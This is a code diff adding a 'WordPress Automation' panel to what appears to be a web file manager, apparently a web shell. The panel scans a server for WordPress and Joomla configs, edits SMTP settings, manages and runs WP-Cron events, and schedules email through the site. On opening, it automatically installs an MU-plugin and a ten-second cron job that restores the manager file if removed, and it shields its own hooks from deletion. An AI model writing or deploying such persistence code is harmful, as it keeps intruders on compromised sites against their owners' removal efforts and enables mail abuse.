+  const sites=scanRes.sites||[],wpSites=sites.filter(s=>s.type==='wordpress');
+  const defaultSite=wpSites[0]||null;
+  body.innerHTML=`
+    <div style="padding:12px 16px;border-bottom:1px solid var(--b2);font-size:12px;color:var(--t2)">
+      Choose a WordPress installation
+      <div style="font-size:10.5px;color:var(--t3);margin-top:4px">${sites.length} CMS installation${sites.length!==1?'s':''} found. The first WordPress site is marked as the default and receives automatic recovery.</div>
+    </div>
+    ${sites.length?sites.map(s=>{
+      const isDefault=defaultSite&&s.config===defaultSite.config;
+      const badge=s.type==='wordpress'
+        ?`<span style="background:rgba(33,117,155,.2);color:#5bc0de;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">WordPress</span>`
+        :`<span style="background:rgba(244,163,51,.15);color:#f4a333;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">Joomla</span>`;
+      return `<div class="wp-auto-site-card" data-cfg="${esc(s.config)}" data-type="${esc(s.type)}" style="display:flex;align-items:center;gap:14px;padding:13px 16px;border-bottom:1px solid var(--b2);cursor:pointer;transition:background .15s" onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
+        <div style="flex:1;min-width:0"><div style="display:flex;align-items:center;gap:8px;margin-bottom:3px">${badge}${isDefault?'<span style="font-size:10px;color:#86efac;font-weight:700">DEFAULT</span>':''}<span style="font-size:12px;font-weight:600;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.dir)}</span></div><div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.config)}</div></div>
+        <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
+      </div>`;
+    }).join(''):'<div class="empty" style="padding:32px"><p>No CMS installations found automatically.</p></div>'}
+    <div style="padding:12px 16px;color:var(--t3);font-size:10.5px">Select a WordPress card to open its automation panel. Joomla is shown for consistency but cannot use WordPress Automation.</div>`;
+  body.querySelectorAll('.wp-auto-site-card').forEach(card=>card.addEventListener('click',()=>{
+    if(card.dataset.type!=='wordpress'){toast('WordPress Automation requires a WordPress installation.');return;}
+    wpAutoCfg=card.dataset.cfg;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';wpAutoLoad(true);
+  }));
+  if(defaultSite){
+    wpAutoInstallRecoveryFor(defaultSite.config).then(r=>{
+      if(!r.ok)toast(r.error||'Automatic recovery setup failed for the default WordPress site.');
+    }).catch(e=>toast('Automatic recovery setup failed: '+String(e)));
+  }
+}
+async function wpAutoLoad(autoRecovery=false){
+  wpAutoCfg=window.fmCmsConfig||null;
+  if(!wpAutoCfg||window.fmCmsType==='joomla'){
+    body.innerHTML=wpAutoMsg('Detecting the WordPress installation…');
+    try{
+      const scanRes=await fetch('?x=cmsscan',{cache:'no-store'}).then(x=>x.json());
+      const sites=scanRes.sites||[];
+      if(sites.length===1&&sites[0].type==='wordpress'){
+        wpAutoCfg=sites[0].config;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';
+      }else{wpAutoShowPicker(scanRes);return;}
+    }catch(e){body.innerHTML=wpAutoMsg('CMS detection failed: '+String(e),'#fca5a5');return;}
+  }
+  body.innerHTML=wpAutoMsg('Loading WordPress settings and cron events…');
+  try{
+    const d=await fetch('?x=wp_automation&cfg='+encodeURIComponent(wpAutoCfg)).then(r=>r.json());
+    if(d.error){body.innerHTML=wpAutoMsg(d.error,'#fca5a5');return;}
+    wpAutoData=d;wpAutoRender();
+    if(autoRecovery)await wpAutoInstallRecovery();
+  }catch(e){body.innerHTML=wpAutoMsg('Failed: '+String(e),'#fca5a5');}
+}
+function wpAutoRender(){
+  const smtp=(wpAutoData.smtp||[]),events=wpAutoData.events||[];
+  const smtpBlocks=smtp.length?smtp.map((x,i)=>`<div style="border:1px solid var(--b2);border-radius:6px;padding:10px;margin-bottom:8px">
+    <div style="font-size:11px;color:var(--t2);margin-bottom:6px;font-weight:700">${esc(x.option)}</div>
+    <textarea class="inp wp-smtp-json" data-option="${esc(x.option)}" style="width:100%;min-height:92px;font-family:monospace;font-size:11px">${esc(JSON.stringify(x.value,null,2))}</textarea>
+    <button class="btn btn-xs btn-p wp-smtp-save" data-option="${esc(x.option)}" style="margin-top:7px">Save SMTP option</button>
+  </div>`).join(''):wpAutoMsg('No supported SMTP plugin option was found. Install/configure a WordPress SMTP plugin first.');
+  const rows=events.map(e=>`<tr>
+    <td style="padding:7px 8px;font-family:monospace;font-size:10.5px">${esc(e.hook)}</td>
+    <td style="padding:7px 8px;font-size:11px">${esc(e.date)}</td>
+    <td style="padding:7px 8px;font-size:11px">${esc(e.schedule||'single')}</td>
+    <td style="padding:7px 8px;text-align:right">${['wordpress_saver','mfm_file_guardian_recover'].includes(e.hook)?'<span style="font-size:10px;color:#86efac;font-weight:700">Protected</span>':`<button class="btn btn-xs btn-red wp-cron-del" data-hook="${esc(e.hook)}" data-ts="${e.timestamp}" data-sig="${esc(e.signature)}">Delete</button>`}</td>
+  </tr>`).join('');
+  body.innerHTML=`<div style="padding:10px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:var(--t3)">WordPress: <span style="font-family:monospace">${esc(wpAutoCfg)}</span></div>
+    <div style="display:flex;gap:5px;padding:8px 16px;border-bottom:1px solid var(--b2);flex-wrap:wrap">
+      <button class="btn btn-xs wp-auto-tab" data-tab="smtp">SMTP settings</button>
+      <button class="btn btn-xs btn-g wp-auto-tab" data-tab="cron">WP-Cron (${events.length})</button>
+     <button class="btn btn-xs btn-g wp-auto-tab" data-tab="mail">Schedule email</button>
+     <button class="btn btn-xs btn-g wp-auto-tab" data-tab="recovery">File recovery</button>
+    </div>
+    <div id="wpAutoPanel" style="padding:14px 16px">${smtpBlocks}</div>`;
+  body.querySelectorAll('.wp-auto-tab').forEach(b=>b.addEventListener('click',()=>wpAutoPanel(b.dataset.tab)));
+  body.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{
+    const ta=body.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');
+    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);
+    const r=await wpAutoPost('?x=wp_smtp_save&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));
+  }));
+  body.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{
+    if(!confirm('Delete this WordPress cron event?'))return;
+    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);
+    const r=await wpAutoPost('?x=wp_cron_delete&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();
+  }));
+}
+function wpAutoPanel(tab){
+  const p=document.getElementById('wpAutoPanel');if(!p)return;
+  if(tab==='smtp'){p.innerHTML=(wpAutoData.smtp||[]).map(x=>`<div style="border:1px solid var(--b2);border-radius:6px;padding:10px;margin-bottom:8px"><div style="font-size:11px;color:var(--t2);font-weight:700;margin-bottom:6px">${esc(x.option)}</div><textarea class="inp wp-smtp-json" data-option="${esc(x.option)}" style="width:100%;min-height:100px;font-family:monospace;font-size:11px">${esc(JSON.stringify(x.value,null,2))}</textarea><button class="btn btn-xs btn-p wp-smtp-save" data-option="${esc(x.option)}" style="margin-top:7px">Save SMTP option</button></div>`).join('')||wpAutoMsg('No supported SMTP plugin option was found.');}
+  if(tab==='cron')p.innerHTML=`<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:9px"><span style="font-size:12px;color:var(--t2)">${wpAutoData.events.length} events found</span><button class="btn btn-xs btn-p" id="wpRunCron">Run due WP-Cron events</button></div><div style="max-height:300px;overflow:auto"><table style="width:100%;border-collapse:collapse"><tr style="color:var(--t3);font-size:10px"><th>Hook</th><th>Time</th><th>Schedule</th><th></th></tr>${wpAutoData.events.map(e=>`<tr><td style="padding:7px 8px;font-family:monospace;font-size:10.5px">${esc(e.hook)}</td><td style="padding:7px 8px;font-size:11px">${esc(e.date)}</td><td style="padding:7px 8px;font-size:11px">${esc(e.schedule||'single')}</td><td><button class="btn btn-xs btn-red wp-cron-del" data-hook="${esc(e.hook)}" data-ts="${e.timestamp}" data-sig="${esc(e.signature)}">Delete</button></td></tr>`).join('')}</table></div>`;
+  if(tab==='mail')p.innerHTML=`<div style="font-size:11px;color:var(--t3);line-height:1.5;margin-bottom:10px">The marked MU-plugin will call WordPress <code>wp_mail()</code> when this one-time cron event runs.</div><input id="wpMailTo" class="inp" style="width:100%;margin-bottom:8px" type="email" placeholder="Recipient"><input id="wpMailSubject" class="inp" style="width:100%;margin-bottom:8px" placeholder="Subject"><textarea id="wpMailBody" class="inp" style="width:100%;height:110px;margin-bottom:8px" placeholder="Message"></textarea><input id="wpMailTime" class="inp" style="width:100%;margin-bottom:10px" type="datetime-local"><button class="btn btn-p" id="wpScheduleMail" style="width:100%">Schedule through WP-Cron</button>`;
+   if(tab==='recovery')p.innerHTML=`<div style="font-size:11.5px;color:var(--t2);line-height:1.55;margin-bottom:12px"><strong style="color:var(--t1)">Optional file recovery</strong><br>This installs a visible MU-plugin and a WP-Cron event that checks every 10 seconds. It stores a compressed copy of the current manager file and restores only <code>${esc(wpAutoData.target||'')}</code> if that file is missing or empty.</div><div id="wpRecoveryState" style="padding:10px;border:1px solid var(--b2);border-radius:7px;color:var(--t3);margin-bottom:10px">Checking status…</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn btn-p" id="wpRecoveryInstall">Install / refresh recovery</button><button class="btn btn-g" id="wpRecoveryRemove">Remove recovery</button></div>`;
+  p.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{const ta=p.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);const r=await wpAutoPost('?x=wp_smtp_save&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));}));
+  p.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{if(!confirm('Delete this WordPress cron event?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);const r=await wpAutoPost('?x=wp_cron_delete&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();}));
+  document.getElementById('wpRunCron')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_cron_run&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'WP-Cron triggered.':(r.error||'Cron failed.'));});
+  document.getElementById('wpScheduleMail')?.addEventListener('click',async()=>{const dt=document.getElementById('wpMailTime').value;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('mail_to',document.getElementById('wpMailTo').value);fd.append('mail_subject',document.getElementById('wpMailSubject').value);fd.append('mail_body',document.getElementById('wpMailBody').value);fd.append('mail_time',dt?Math.floor(new Date(dt).getTime()/1000):0);const r=await wpAutoPost('?x=wp_cron_email&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'Email scheduled through WP-Cron.':(r.error||'Scheduling failed.'));if(r.ok)wpAutoLoad();});
+   if(tab==='recovery'){wpAutoPost('?x=wp_recovery_status&cfg='+encodeURIComponent(wpAutoCfg),new FormData()).then(r=>{const s=document.getElementById('wpRecoveryState');if(s)s.innerHTML=r.error?esc(r.error):(r.installed?`Installed. Next event: ${(r.events||[]).map(e=>esc(e.date)).join(', ')||'pending'}`:'Not installed.');}).catch(()=>{const s=document.getElementById('wpRecoveryState');if(s)s.textContent='Status check failed.';});document.getElementById('wpRecoveryInstall')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_install&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'WP-Cron file recovery installed.':(r.error||'Install failed.'));if(r.ok)wpAutoPanel('recovery');});document.getElementById('wpRecoveryRemove')?.addEventListener('click',async()=>{if(!confirm('Remove the visible WP-Cron file recovery helper?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_remove&cfg='+encodeURIComponent(wpAutoCfg),fd);toast(r.ok?'WP-Cron file recovery removed.':(r.error||'Remove failed.'));if(r.ok)wpAutoPanel('recovery');});}
+}
+document.getElementById('wpAutomationBtn')?.addEventListener('click',()=>{openMod('wpAutomationOv');wpAutoLoad(true);});
+document.getElementById('wpAutomationClose')?.addEventListener('click',()=>closeMod('wpAutomationOv'));
+
+})(); // end WordPress Automation IIFE
 
 /* HELPERS */
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
